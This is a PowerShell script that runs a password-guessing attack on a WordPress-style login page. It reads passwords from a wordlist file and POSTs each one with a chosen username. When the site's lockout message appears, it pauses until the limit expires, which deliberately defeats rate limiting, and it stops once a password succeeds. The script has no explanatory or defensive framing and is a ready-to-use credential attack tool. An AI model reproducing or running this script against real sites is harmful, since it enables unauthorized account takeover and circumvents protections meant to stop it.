# Ask for user input
$loginUrl = Read-Host "Enter the login URL"
$username = Read-Host "Enter the username"
$passwordFile = Read-Host "Enter the location of the password file"

# Open the file and read it line by line
try {
    $fileStream = [System.IO.StreamReader]::new($passwordFile)
} catch {
    Write-Host "Error opening the password file: $_"
    exit
}

try {
    while ($null -ne ($password = $fileStream.ReadLine())) {
        # Create the body of the POST request
        $body = @{
            log = $username
            pwd = $password
        }

        # Send the POST request
        $response = Invoke-WebRequest -Uri $loginUrl -Method POST -Body $body -ContentType "application/x-www-form-urlencoded"

        # Output the attempted password and the response content
        Write-Host "Attempting password: $password"
#        Write-Host "Response: $($response.Content)"

        # Parse the HTML response
        $html = $response.ParsedHtml

        # Check for the authentication limit error
        $loginError = $html.getElementById("login_error")
        if ($loginError -and $loginError.innerText -match "ERROR: You have reached authentication limit, you will be able to try again in (\d+) minutes") {
            $minutes = [int]$matches[1] + 1
            Write-Host "Reached authentication limit. Pausing for $minutes minutes."
            Start-Sleep -Seconds ($minutes * 60)
        } elseif ($loginError -and $loginError.innerText -like "*incorrect*") {
            Write-Host "Attempt with password '$password' failed."
        } else {
            Write-Host "Password '$password' is correct."
            break
        }
    }
} finally {
    $fileStream.Close()
}
